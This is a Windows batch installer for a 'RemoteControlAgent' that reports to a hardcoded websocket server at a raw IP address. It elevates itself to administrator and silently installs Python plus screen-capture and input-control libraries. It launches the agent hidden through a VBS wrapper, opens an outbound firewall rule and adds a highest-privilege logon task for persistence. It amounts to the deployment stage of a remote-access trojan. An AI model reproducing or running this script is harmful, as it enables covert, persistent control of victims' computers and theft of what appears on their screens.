@echo off
setlocal EnableDelayedExpansion

set SERVER_URL=ws://67.241.173.150:7777
set SECRET=mike
set INSTALL_DIR=%ProgramFiles%\RemoteControlAgent

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe' -OutFile '%TEMP%\py.exe'" >nul 2>&1
    "%TEMP%\py.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
    for /f "tokens=*" %%i in ('powershell -Command "[Environment]::GetEnvironmentVariable(\"PATH\",\"Machine\")"') do set "PATH=%%i"
    set "PATH=!PATH!;%ProgramFiles%\Python312;%ProgramFiles%\Python312\Scripts"
    python --version >nul 2>&1
    if %errorlevel% neq 0 ( set PYTHON="%ProgramFiles%\Python312\python.exe" ) else ( set PYTHON=python )
) else ( set PYTHON=python )

!PYTHON! -m pip install websockets pyautogui pillow --quiet --no-warn-script-location

mkdir "%INSTALL_DIR%" >nul 2>&1
copy /y "%~dp0agent.py" "%INSTALL_DIR%\agent.py" >nul

(
echo Set s = CreateObject^("WScript.Shell"^)
echo s.Environment^("Process"^)^("RC_SERVER"^) = "%SERVER_URL%"
echo s.Environment^("Process"^)^("RC_SECRET"^) = "%SECRET%"
echo s.Run "!PYTHON! ""%INSTALL_DIR%\agent.py""", 0, False
) > "%INSTALL_DIR%\run.vbs"

netsh advfirewall firewall add rule name="RemoteControlAgent" dir=out action=allow program="!PYTHON!" enable=yes >nul 2>&1

schtasks /delete /tn "RemoteControlAgent" /f >nul 2>&1
schtasks /create /tn "RemoteControlAgent" /tr "wscript.exe \"%INSTALL_DIR%\run.vbs\"" /sc onlogon /rl highest /f >nul 2>&1

start "" /b wscript.exe "%INSTALL_DIR%\run.vbs"

echo Done. Agent running silently.
timeout /t 3 >nul
